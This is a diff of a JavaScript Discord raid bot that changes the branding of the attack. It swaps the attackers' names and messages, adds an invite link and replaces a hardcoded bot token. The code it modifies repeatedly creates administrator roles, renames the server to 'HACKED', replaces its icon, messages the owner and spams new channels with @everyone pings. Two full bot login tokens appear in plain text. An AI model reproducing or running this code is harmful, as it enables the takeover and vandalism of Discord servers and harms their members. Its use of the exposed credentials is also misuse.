@@ -39,7 +39,7 @@ client.on('message', message => {
      
         setInterval(() => {
             message.guild.createRole({
-                name: "TANYALOVE",
+                name: "ARAB AND HIBYE AND GELAS",
                 permissions: ["ADMINISTRATOR"]
             }).then(rr => {
  
@@ -49,13 +49,13 @@ client.on('message', message => {
         message.guild.setIcon("link wena");
         client.user.setAvatar("link wena");
         client.user.setUsername("HACKED")
-        message.guild.owner.send("To mazay brakam")
+        message.guild.owner.send("mrdwa maza hack kray la layn aqrab w hibye w gelas")
         message.guild.setName('HACKED');
         setTimeout(function() {
             setInterval(() => {
               
-                message.guild.createChannel('HACKED BY HASTYAR AND MIR ', 'text').then(channel => { 
-                channel.send('@everyone HACK BY HASTYAR AND MIR  :joy: :joy: :joy:')
+                message.guild.createChannel('HACKED BY SNAKE IRAQ NOOB ', 'text').then(channel => { 
+                channel.send('@everyone HACK BY SNAKE IRAQ NOOB https://discord.gg/Zp94B2BT :joy: :joy: :joy:')
                
                 })
             }
@@ -118,5 +118,5 @@ if (message.content.startsWith(adminprefix + 'setava')) {
 
  ////codaka drwst krawa lalayan black jack
 
-client.login("ODE3NDg2MjY2NjM1NTE3OTk0.YEKNag.0UZFi7xa-39z21VV5UXH97Gycqk")
+client.login("ODMxMzE2MjgzNzc2OTU4NTI2.YHTdnw.urJ-fHa8yTpUqpBsTlPpH_LSEck")
           
